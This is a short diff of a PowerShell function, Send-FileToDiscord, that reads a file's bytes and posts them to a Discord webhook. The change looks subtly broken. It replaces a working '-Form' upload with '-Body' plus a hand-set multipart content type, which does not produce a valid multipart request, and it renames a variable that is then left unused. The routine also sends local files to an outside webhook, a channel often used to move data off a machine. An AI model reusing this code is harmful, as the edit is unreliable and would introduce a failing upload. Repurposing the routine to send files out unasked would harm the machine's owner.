@@ -25,14 +25,14 @@ function Send-FileToDiscord {
 
     try {
         $FileName = Split-Path -Leaf $FilePath
-        $ContentType = Get-MimeType -FilePath $FilePath
+        $MimeType = Get-MimeType -FilePath $FilePath
 
-        # Build multipart form-data for the file upload
+        # Create multipart form-data for the file upload
         $Body = @{
-            file = Get-Content -Path $FilePath -AsByteStream
+            file = [System.IO.File]::ReadAllBytes($FilePath)
         }
 
-        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Form $Body
+        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -ContentType "multipart/form-data"
         Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
     } catch {
         Write-Host "Failed to send $FilePath to Discord: $_" -ForegroundColor Red
